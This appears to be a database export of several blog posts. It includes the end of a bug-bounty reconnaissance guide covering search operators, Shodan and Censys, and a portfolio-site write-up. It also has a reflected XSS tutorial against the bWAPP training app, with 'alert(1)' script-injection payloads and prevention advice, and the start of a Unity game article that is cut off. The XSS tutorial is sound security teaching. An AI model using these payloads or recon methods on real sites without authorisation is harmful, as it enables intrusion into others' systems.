class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search text of page only</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">intext: '"admin credentials'"</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">allintext</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search text of page only</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">allintext: '"security tools'"</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">site</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search specific site</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">site:example.com</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">link</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search for links to pages</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">link:bing.com</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">inanchor</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search link anchor text</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">inanchor:'"guest user'"</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">numrange</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Locate specific number</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">numrange:1-100</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">cache</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search for cached version of any website</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">cache:www.example.com</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_all_border'" style='"box-sizing: border-box; border: 1px solid rgb(209, 209, 209); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">related</font></span></td><td class='"blog_table_no_left_with_bottom_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); border-bottom: 1px solid rgb(209, 209, 209); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search for similar types of website</font></span></td><td class='"blog_table_no_left_with_bottom_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); border-bottom: 1px solid rgb(209, 209, 209); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" style='"'" size='"4'">related:www.example.com</font></span></td></tr></tbody></table><br></font></div><div><font style='"'"><b><font size='"5'">9. Shodan</font></b><br></font></div><div><font style='"'"><font size='"4'"><br></font></font></div><div><font style='"'"><font size='"4'"><div>Shodan is a search engine, hackers and security researchers use to find vulnerable Internet of Things devices and querying to the engine he/she can get the device IP address, web server details, banner, ISP, SSH, FTP, TELNET and many more.</div><div><br></div><div>For hackers, it''s a great playground to gather as much information from a target.</div><div><br></div></font></font></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">product<span class='"token operator'">:</span><span class='"token maybe-class-name'">MongoDB</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'"><b>For more information -</b> <a href='"https://www.shodan.io/'"><font color='"#dd4124'"><b>https://www.shodan.io/</b></font></a></font><br></div><div><br></div><div><font size='"5'"><b>10. Censys</b></font><br></div><div><br></div><div><font size='"4'">Censys is a search engine which is pretty similar to Shodan, it allows hackers and security researchers to scans devices, hosts and gives an aggregate report on how the systems are configured (Certificates, Websites, etc.) and deployed. Censys is designed to find out poorly configured devices over the internet and due to it maintains a large amount of database it''s very much useful to gather information for a specific target.</font></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">www<span class='"token punctuation'">.</span><span class='"token property-access'">example</span><span class='"token punctuation'">.</span><span class='"token property-access'">com</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'"><b>For more information -</b> <a href='"https://censys.io/'"><font color='"#dd4124'"><b>https://censys.io/</b></font></a></font><br></div><div><br></div><div><span style='"font-size: large;'">I hope you understand by now why RECON is important in Bug Bounty and I found these are the top 10 Recon tools which you can use to gather as much information for a specific target but there are also many other different tools which you can explore for information gathering, in my future tutorials I''ll demonstrate those tools.</span><br></div><div><font size='"4'"><br></font></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,t,"<font face='"Lora, serif'" size='"4'">The article was highly appreciated by many&nbsp;<a href='"https://en.wikipedia.org/wiki/Information_security'"><font color='"#dd4124'">InfoSec</font></a> communities&nbsp;and featured in their platforms as top automation &amp; reconnaissance&nbsp;article for Bug Bounty.</font><div><font face='"Lora, serif'" size='"4'"><br></font></div><div><font face='"Lora, serif'" size='"4'"><b>Top Mentions</b></font></div><div><ul><li><font face='"Lora, serif'" size='"4'" color='"#dd4124'"><a href='"https://github.com/OWASP/Amass#top-mentions'"><font color='"#dd4124'">OWASP Amass GitHub&nbsp;Project</font></a>&nbsp;</font><font face='"Lora, serif'" size='"4'">- by <a href='"https://twitter.com/jeff_foley'"><font color='"#dd4124'">@jeff_foley</font></a></font></li><li><font size='"4'"><a href='"https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/blogposts.md#automation--recon'"><font color='"#dd4124'">Resources for Beginner Bug Bounty Hunters</font></a> -&nbsp;by <a href='"https://twitter.com/NahamSec'"><font color='"#dd4124'">@NahamSec</font></a></font><br></li><li><font size='"4'"><a href='"https://twitter.com/Alra3ees/status/1225903602717405185'"><font color='"#dd4124'">10 Recon Tools For Bug Bounty</font></a> - by <a href='"https://twitter.com/Alra3ees'"><font color='"#dd4124'">@Alra3ees</font></a></font><br></li></ul><div><br></div></div>",t
20,My Portfolio | Full Stack MERN Application,my-portfolio-full-stack-mern-application,Anshuman Pattnaik,2020-06-25 01:27:51.110159+05:30,2021-06-04 01:34:10.345441+05:30,https://assets.hackbotone.com/assets/my-portfolio-full-stack-mern-application/seo_thumbnail.png,https://assets.hackbotone.com/assets/my-portfolio-full-stack-mern-application/small_thumbnail.png,https://assets.hackbotone.com/assets/my-portfolio-full-stack-mern-application/large_thumbnail.png,"{'"Application Development'",Portfolio,node.js,mongodb}","A portfolio site is essential for every software developer to showcase projects and technical skills which demonstrates what you can do based upon your resume, your portfolio will be very much helpful on the job search because the employer can able to see your work and will be easier for them to evaluate your work for the suitable job, nowadays for every software developer is quite essential to maintain a web presence like official GitHub, Twitter account & your website, so that you can reach out developer communities and build a developer network.","<b><font size='"5'">Why a portfolio site is essential for a Software developer?</font></b><div><b><font size='"5'"><br></font></b></div><div><font size='"4'">A portfolio site is essential for every software developer to showcase projects and technical skills which demonstrates what you can do based upon your resume, your portfolio will be very much helpful on the job search because the employer can able to see your work and will be easier for them to evaluate your work for the suitable job, nowadays for every software developer is quite essential to maintain a web presence like official GitHub, Twitter account &amp; your website, so that you can reach out developer communities and build a developer network.</font><br></div><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/nodp9iETm4A'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><div><b><font size='"5'">Tips to highlight areas on your portfolio</font></b></div><div><br></div><div><font size='"4'">While building your portfolio website a few things you need to focus on</font></div><div><br></div><div><ul><li><font size='"4'">Single page application (Don''t use templates)</font></li><li><font size='"4'">Short introduction</font></li><li><font size='"4'">Top Skills</font></li><li><font size='"4'">Best projects - (Try not to highlight every single project)</font></li><li><font size='"4'">Popular blogs - (Top 10/5/3)</font></li><li><font size='"4'">Contacts</font></li></ul></div><div><br></div><div><font size='"4'">And always it''s quite important to know that don''t use templates while building your website because the templates are pre-built all you need to do is change the content of the template and the website will be completed and as a software developer, you shouldn''t be using templates as it won''t highlight your technical expertise to make a website and also some other may use the same template, so always built your website from scratch to make it unique so that it will reflect your creative skills to the outside world and your work will be appreciated by the developer communities.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">After building your website when you are planning to mention your projects always remember one thing don''t mention every single project on your website which are the projects either in production or in GitHub with a well-maintained version controls that you can mention in your portfolio and always make the website as a single page web application so that it will be easier for the employer to know about yourself quickly.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">The same approach I have also followed while building my portfolio site, I have tried to short my introduction, top skills, best projects &amp; my popular blogs, so that it will be easier for everyone to know about myself in a short time.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">My portfolio - <a href='"https://myportfolio.hackbotone.com/'"><font color='"#dd4124'"><b>https://myportfolio.hackbotone.com</b></font></a></font></div><div><br></div><div><font size='"5'"><b>How I built my portfolio site from scratch?</b></font></div><div><br></div><div><font size='"4'">I have built my site using react.js as a front end, node.js as a back-end, and MongoDB as storage, for better performance I have implemented server-side rendering technique which is a very popular technique for rendering client-side webpage on the server and server will send the complete result to the client, and to bundle the module I have used Webpack which is a module bundler to bundle JavaScript, front-end assets.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">I have made the complete development open-source on my GitHub&nbsp;so that it will be helpful for you while building your portfolio website.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'" color='"#dd4124'"><b><a href='"https://github.com/anshumanpattnaik/reactjs-portfolio-mern-website'"><font color='"#dd4124'">https://github.com/anshumanpattnaik/reactjs-portfolio-mern-website</font></a></b></font></div><div><font size='"4'"><br></font></div><div><font size='"4'">So this is the overall explanation of this website, I hope you guys understood as of now that why the portfolio side is essential for the software developer if you find any types of issue in my code then please feel free to raise an issue on GitHub.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">Thank you &amp; Happy coding :)</font></div></div>",t,f,"",f
11,Cross-site-Scripting - Reflected (EVAL & HREF),cross-site-scripting-reflected-eval-and-href,Anshuman Pattnaik,2019-05-27 01:26:08.566743+05:30,2021-06-04 01:32:36.629634+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/large_thumbnail.png,"{bWAPP,'"Penetration Testing'",'"Reflected XSS'",bWAPP}","This is the demonstration of Cross-Site-Scripting attack in eval function and Hypertext reference and for this demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of Cross-Site-Scripting attack in eval function and Hypertext reference and for this demo, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/omWqGYEfq2Y'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><b><font size='"5'">How to perform a Cross-Site Scripting attack in eval function?</font></b><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (Eval)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><font size='"5'"><b>What is eval?</b></font><br></div><div><br></div><div><font size='"4'">eval() is a global function in JavaScript and it evaluates a JavaScript expression, variable, statement, or sequence of statements as JavaScript code and after that, it executes that piece of code.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_2.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As you can see the date function is being used to display the current date of my computer and this Date() function is an example of eval() and as it''s an eval function so we can write alert() function also.</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token number'">1</span><span class='"token punctuation'">)</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_3.png'"><br></div><div><br></div><div><font size='"4'">As you can see it''s executed the <b>alert(1)</b> function.</font><br></div><div><br></div><div><b><font size='"5'">How to prevent this attack?</font></b><br></div><div><br></div><div><div><font size='"4'">The better way to prevent this attack is you shouldn''t be using eval() at all while developing a website and as per the Mozilla developer documentation it''s very dangerous function and it could be used by the third party for malicious purposes. And also it slow because it has to invoke JS interpreter to execute the code.&nbsp;</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">For more information please check out Mozilla developer documentation:- <a href='"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval'"><font color='"#dd4124'">Standard built-in objects - eval()</font></a></font></div></div><div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_4.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (HREF)</b> from the drop-down menu and click Hack.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_5.png'"><font size='"4'"><br></font></div><div><font size='"4'"><br></font></div><div><div style='"'"><font size='"4'">In this demo what it does, it takes the input from the first screen and displays it on the second screen. So on my first screen, I enter my name '"<b>Anshuman</b>'" in the input box and it will reflect on the next screen.</font></div></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_6.png'"><font size='"4'"><br></font></div><div style='"'"><br></div><div style='"'"><div><font size='"4'">As you can see on the second screen my name reflecting on the web page and as it''s reflecting we can inject JavaScript code. In order to inject JavaScript code first, we need to check the DOM structure of that particular HTML element. So right click on the webpage and choose view page source to check the source code of this particular webpage.</font></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_7.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">As you can see my name is reflecting and in order to inject the code first, we need to close this greater than and less than angular parenthesis then we can inject <b>&lt;script&gt;</b> tag. So the final payload will be as below.</font></div></div><div><br></div></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&gt;</span><span class='"token operator'">&lt;</span>script<span class='"token operator'">&gt;</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token number'">1</span><span class='"token punctuation'">)</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span><span class='"token operator'">&lt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_8.png'"><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-eval-href/cross_site_scripting_reflected_eval_href_9.png'"><br></div><div><br></div><div><font size='"4'">So as you can see we are able to inject JavaScript code inside hypertext reference. And to prevent this it requires proper sanitization of special characters then we can prevent this attack.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">For more information?</font></b></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><ol><li><font size='"4'"><font color='"#dd4124'"><a href='"https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)'"><font color='"#dd4124'">Cross-site Scripting (XSS)</font></a></font><br></font></li><li><font size='"4'"><a href='"https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet'"><font color='"#dd4124'">XSS (Cross Site Scripting) Prevention Cheat Sheet</font></a><br></font></li></ol></div><div><font size='"4'"><br></font></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f,"",f
19,Forest Assassin 2D Platformer Game,forest-assassin-2d-platformer-game,Anshuman Pattnaik,2020-05-01 01:27:14.550509+05:30,2021-06-04 01:33:42.82428+05:30,https://assets.hackbotone.com/assets/forest-assassin-2d-platformer-game/seo_thumbnail.png,https://assets.hackbotone.com/assets/forest-assassin-2d-platformer-game/small_thumbnail.png,https://assets.hackbotone.com/assets/forest-assassin-2d-platformer-game/large_thumbnail.png,"{'"Game Development'",Unity3D,HTML5}","Forest Assassin is a 2D adventure platformer game with easy controls and fun gameplay, which helps every one to get started, this is a classic platformer game with wonderfully designed characters and world. To complete the game collect all the coins and the trophy try to collect all 100 gold coins to become the highest scorer in this adventurers platformer game, on your way you will face many obstacles and enemies and use your sword to fight with the enemy.","<b><font size='"5'">Introduction</font></b><div><b><font size='"5'"><br></font></b></div><div><b style='"'"><font size='"6'">F</font></b><font size='"4'">orest Assassin is a 2D adventure platformer game with easy controls and fun gameplay, which helps every one to get started, this is a classic platformer game with wonderfully designed characters and world. To complete the game collect all the coins and the trophy try to collect all 100 gold coins to become the highest scorer in this adventurers platformer game, on your way you will face many obstacles and enemies and use your sword to fight with the enemy.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">How to play the game on desktop browser?</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><div><font size='"4'">To make it easier for the user I have also published as a desktop browser game because people always love to play browser games and the reason is its quick easy no need for any types of installation.&nbsp;</font></div><div><span style='"font-size: large;'"><br></span></div><div><span style='"font-size: large;'">Currently, the game is available at </span><a href='"https://games.hackbotone.com/forest-assassin/'" style='"font-size: large;'"><font color='"#dd4124'"><b>https://games.hackbotone.com/forest-assassin/</b></font></a><span style='"font-size: large;'"> and it supports all the modern desktop browsers.</span></div></div><div><span style='"font-size: large;'"><br></span></div><div><ul><li><font size='"4'">To move use [ A ] [ D ] or arrow keys</font><br></li><li><font size='"4'">Use [ SPACE ] key to jump<br></font></li><li><font size='"4'">Use [ W ] key to attack<br></font></li><li><font size='"4'">To finish the game collect all coins and the trophy<br></font></li></ul><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">How to play the game on Android device?</font></b><br></div></div><div><span style='"font-size: large;'"><br></span></div><div><div style='"'"><font size='"4'">Forest Assassin is also available for Android devices and on the smartphone user will get the feelings of a classic platformer game. So please download the game and share your experience.</font></div><div style='"'"><b style='"color: rgb(221, 65, 36); font-size: large;'"><br></b></div><div style='"'"><b style='"font-size: large;'"><font color='"#dd4124'" style='"'"><font color='"#dd4124'">&nbsp;<a href='"https://play.google.com/store/apps/details?id=com.forestassassin'" style='"'"><font color='"#dd4124'">https://play.google.com/store/apps/details?id=com.forestassassin</font></a></font></font></b><br></div></div><div style='"'"><b style='"font-size: large;'"><font color='"#dd4124'" style='"'"><br></font></b></div><div style='"'"><ul><li><font size='"4'">To move use [ LEFT ] &amp; [ RIGHT ] arrow button</font><br></li><li><font size='"4'">Use [ UP ] arrow button to jump<br></font></li><li><font size='"4'">Use [ SWORD ] button to attack<br></font></li><li><font size='"4'">To finish the game collect all coins and the trophy<br></font></li></ul><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/Cm78Do9VO8s'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><div style='"'"><b style='"'"><font size='"5'">How to built a 2D platformer game using Unity3d?</font></b></div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'">Unity3d game engine is a great platform to build a 2D or 3D game because it provides many major components such as physics, animation, cross-platform support and many more. And before starting to build any types of game the very first thing you need to do is design a Game Theory which means you need to build the idea behind the game which will help you to develop a successful game and always try to remember while designing a Game theory make it simpler and don''t make it complicated otherwise it will be quite difficult for you to finish the game.</div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'">If we see an example of a legendary <a href='"http://www.trex-game.skipser.com/'"><font color='"#dd4124'"><b>T-Rex Game</b></font></a> which you often play on Google chrome browser when you don''t have an internet connection and this game is the best example of a 2D platformer game and if you look at the game then you noticed the game is very simple and easy to play all you need to do is press the SPACE bar on the keyboard to avoid the obstacles and earn points.</div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'">The similar approach I also follow while designing this game at the very beginning my goal was to build a simple 2D platformer game so that any types of user can play and have fun and also it should help me while building this game. And my game theory is there is a king who hunts for the treasure and during his mission, he will face many enemies and there will be a 3 minutes time limit to complete the game.</div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'">And that''s all the theory behind my game and you should also follow a similar approach while building your game.</div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'">So now let''s discuss what are the tools and techniques behind Forest Assassin game?</div></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><div style='"'"><b style='"'"><font size='"5'">Tools &amp; Techniques</font></b></div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'">In every 2D platformer game, there are many components which we need to build to finish the game and these components are the major elements of every platformer game.</div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'"><ul><li>Character Movement</li><li>Character Death</li><li>Character attack</li><li>Score Counter</li><li>Timer</li></ul></div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'">So now let''s discuss how I have implemented all of these components into my game one by one.</div><div style='"font-size: large;'"><br></div><div style='"'"><div style='"'"><b style='"'"><font size='"5'">Character Movement</font></b></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">To move a character in the game you need to have a script which will control the character to Walk, Jump, Crawl and so on and also it requires physics.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">To control the physics Unity provides a component called <a href='"https://docs.unity3d.com/ScriptReference/Rigidbody.html'"><font color='"#dd4124'"><b>Rigidbody</b></font></a> which handles lots of fundamental physics like force and acceleration and this component you can use with anything which you want to interact with the physics.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">At last, it requires a floor where the character can able to walk in Unity it''s called Collider component and there are many different types of collider are available such as Box Collider, Circle Collider, etc.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">When you have all of these elements in place then you can able to move your character.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><b style='"'"><font size='"5'">Character Death - (Game Over)</font></b></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">In this game, the character can only die when he touches with the enemy or with the water and to handle the trigger between the collider Unity has an API called <a href='"https://docs.unity3d.com/ScriptReference/MonoBehaviour.OnTriggerEnter2D.html'"><font color='"#dd4124'"><b>OnTriggerEnter2D(Collider2D trigger)</b></font></a> which will handle the trigger between the collider and after the collider, it will send a message to the Collider2D parameter which we can use to decide the death of our character.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">And to make it organize&nbsp;I have assign tag name called ''Enemy'' so that in future if I will add one more enemy then all I need to do is assign this tag name to this component and it will be handled through the Script.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><b style='"'"><font size='"5'">Character attack</font></b></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">Character attack is the most crucial element in every game because this is how you win the game and while building this component the two things you need to understand first is the animation and second is the attack script.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">To make the <a href='"https://docs.unity3d.com/Manual/AnimationSection.html'"><font color='"#dd4124'"><b>animation</b></font></a> in 2D first you need to gather all the <a href='"https://docs.unity3d.com/Manual/Sprites.html'"><font color='"#dd4124'"><b>sprites</b></font></a> and add it to the animation component and create your animation and later you can use it through the script.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">While writing the attack script a few things we need to know such as Attack range and attack point because it''s quite important that from which position the character will set his attack vector and in this game Sword 